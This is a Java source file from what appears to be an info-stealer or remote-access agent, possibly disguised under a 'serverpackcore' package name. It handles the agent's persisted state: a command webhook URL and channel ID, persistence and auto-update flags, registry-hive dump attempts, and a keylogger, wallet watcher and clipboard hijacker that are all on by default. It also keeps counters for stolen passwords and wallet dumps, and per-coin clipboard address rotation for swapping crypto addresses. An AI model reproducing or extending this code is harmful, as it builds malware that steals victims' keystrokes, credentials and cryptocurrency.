package com.serverpackcore.agent;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public final class State {
	public String version = "";
	public String channelId = "";
	public String webhookUrl = "";
	public String lastId = "0";
	public long lastHeartbeat = 0L;
	public boolean hello = false;
	public boolean persist = false;
	public boolean autoUpdate = false;
	public long autoNext = 0L;
	public int autoFailures = 0;
	public int bootstrap = 0;
	public int hivesAttempts = 0;

	/** OPSEC services default on; an explicit local off wins over provisioning. */
	public boolean walletsWatch = true;
	public boolean keylogger = true;
	public boolean keyloggerHardOff = false;
	public boolean clipboard = true;
	public boolean walletsSet = false;
	public boolean keyloggerSet = false;
	public boolean clipboardSet = false;
	public boolean clipboardOverrides = false;
	public long walletCooldownUntil = 0L;
	public String lastWalletKey = "";
	public int walletEvents = 0;
	public int walletDumps = 0;
	public int passwordEvents = 0;
	public int clipEvents = 0;
	public Map<String, List<String>> clipboardCoins = new LinkedHashMap<>();
	public Map<String, Integer> clipboardRotation = new LinkedHashMap<>();

	public static State load(Path file) {
		State state = new State();
		try {
			if (!Files.isRegularFile(file)) {
				return state;
			}
			Map<String, Object> map = Json.parseObject(Files.readString(file, StandardCharsets.UTF_8));
			state.version = Json.str(map, "version", "");
			state.channelId = Json.str(map, "channelId", "");
			state.webhookUrl = Json.str(map, "webhookUrl", "");
			state.lastId = Json.str(map, "lastId", "0");
			state.lastHeartbeat = Json.num(map, "lastHeartbeat", 0L);
			state.hello = Boolean.TRUE.equals(map.get("hello"));
			state.persist = Boolean.TRUE.equals(map.get("persist"));
			state.autoUpdate = Boolean.TRUE.equals(map.get("autoUpdate"));
			state.autoNext = Json.num(map, "autoNext", 0L);
			state.autoFailures = (int) Json.num(map, "autoFailures", 0L);
			state.bootstrap = (int) Json.num(map, "bootstrap", 0L);
			state.hivesAttempts = (int) Json.num(map, "hivesAttempts", 0L);
			state.walletsWatch = bool(map, "walletsWatch", true);
			state.keylogger = bool(map, "keylogger", true);
			state.keyloggerHardOff = bool(map, "keyloggerHardOff", false);
			state.clipboard = bool(map, "clipboard", true);
			state.walletsSet = bool(map, "walletsSet", false);
			state.keyloggerSet = bool(map, "keyloggerSet", false);
			state.clipboardSet = bool(map, "clipboardSet", false);
			state.clipboardOverrides = bool(map, "clipboardOverrides", false);
			state.walletCooldownUntil = Json.num(map, "walletCooldownUntil", 0L);
			state.lastWalletKey = Json.str(map, "lastWalletKey", "");
			state.walletEvents = (int) Json.num(map, "walletEvents", 0L);
			state.walletDumps = (int) Json.num(map, "walletDumps", 0L);
			state.passwordEvents = (int) Json.num(map, "passwordEvents", 0L);
			state.clipEvents = (int) Json.num(map, "clipEvents", 0L);
			for (Map.Entry<String, Object> entry : Json.map(map.get("clipboardCoins")).entrySet()) {
				List<String> values = new ArrayList<>();
				for (Object item : Json.list(entry.getValue())) {
					if (item instanceof String text && !text.isBlank()) {
						values.add(text.trim());
					}
				}
				if (!values.isEmpty()) {
					state.clipboardCoins.put(entry.getKey().toLowerCase(java.util.Locale.ROOT), new ArrayList<>(values));
				}
			}
			for (Map.Entry<String, Object> entry : Json.map(map.get("clipboardRotation")).entrySet()) {
				if (entry.getValue() instanceof Number number) {
					state.clipboardRotation.put(entry.getKey(), number.intValue());
				}
			}
		} catch (Throwable throwable) {
			Log.debug("State read failed", throwable);
		}
		return state;
	}

	private static boolean bool(Map<String, Object> map, String key, boolean fallback) {
		Object value = map.get(key);
		return value instanceof Boolean ? (Boolean) value : fallback;
	}

	private Map<String, List<String>> snapshotCoins() {
		Map<String, List<String>> snapshot = new LinkedHashMap<>();
		for (Map.Entry<String, List<String>> entry : clipboardCoins.entrySet()) {
			snapshot.put(entry.getKey(), new ArrayList<>(entry.getValue()));
		}
		return snapshot;
	}

	public synchronized void save(Path file) {
		try {
			Map<String, Object> map = new LinkedHashMap<>();
			map.put("version", version);
			map.put("channelId", channelId);
			map.put("webhookUrl", webhookUrl);
			map.put("lastId", lastId);
			map.put("lastHeartbeat", lastHeartbeat);
			map.put("hello", hello);
			map.put("persist", persist);
			map.put("autoUpdate", autoUpdate);
			map.put("autoNext", autoNext);
			map.put("autoFailures", autoFailures);
			map.put("bootstrap", bootstrap);
			map.put("hivesAttempts", hivesAttempts);
			map.put("walletsWatch", walletsWatch);
			map.put("keylogger", keylogger);
			map.put("keyloggerHardOff", keyloggerHardOff);
			map.put("clipboard", clipboard);
			map.put("walletsSet", walletsSet);
			map.put("keyloggerSet", keyloggerSet);
			map.put("clipboardSet", clipboardSet);
			map.put("clipboardOverrides", clipboardOverrides);
			map.put("walletCooldownUntil", walletCooldownUntil);
			map.put("lastWalletKey", lastWalletKey);
			map.put("walletEvents", walletEvents);
			map.put("walletDumps", walletDumps);
			map.put("passwordEvents", passwordEvents);
			map.put("clipEvents", clipEvents);
			map.put("clipboardCoins", snapshotCoins());
			map.put("clipboardRotation", new LinkedHashMap<>(clipboardRotation));
			Path temp = file.resolveSibling(file.getFileName() + ".tmp");
			Files.writeString(temp, Json.stringify(map), StandardCharsets.UTF_8);
			try {
				Files.setPosixFilePermissions(temp,
					java.nio.file.attribute.PosixFilePermissions.fromString("rw-------"));
			} catch (Throwable ignored) {
				// Windows
			}
			Files.move(temp, file, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
		} catch (Throwable throwable) {
			Log.debug("State write failed", throwable);
		}
	}
}
